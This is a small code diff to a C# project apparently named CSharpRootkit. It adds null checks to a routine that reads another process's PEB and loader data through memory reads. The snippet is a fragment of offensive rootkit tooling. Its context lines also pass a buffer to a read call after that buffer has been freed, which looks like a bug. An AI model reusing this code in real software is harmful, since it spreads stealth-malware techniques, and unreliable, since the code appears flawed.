@@ -88,7 +88,12 @@ namespace CSharpRootkit
                 }
                 PebBaseAddress = PBI.PebBaseAddress;
             }
-            
+
+            if (PebBaseAddress == 0) 
+            {
+                return 0;
+            }
+
             ulong ldrAddr = InternalStructs64.GetLdr64(PebBaseAddress);
             int pLdrDataSize = Marshal.SizeOf(typeof(ULONGRESULT));
             IntPtr pLdrData = Marshal.AllocHGlobal(pLdrDataSize);
@@ -101,6 +106,11 @@ namespace CSharpRootkit
 
             ulong pLdr64 = Marshal.PtrToStructure<ULONGRESULT>(pLdrData).Value;
             Marshal.FreeHGlobal(pLdrData);
+
+            if (pLdr64 == 0) 
+            {
+                return 0;
+            }
 
             if (!ReadProperBitnessProcessMemory(hProcess, ldrAddr, pLdrData, (UIntPtr)pLdrDataSize, ref Rread_out))
             {
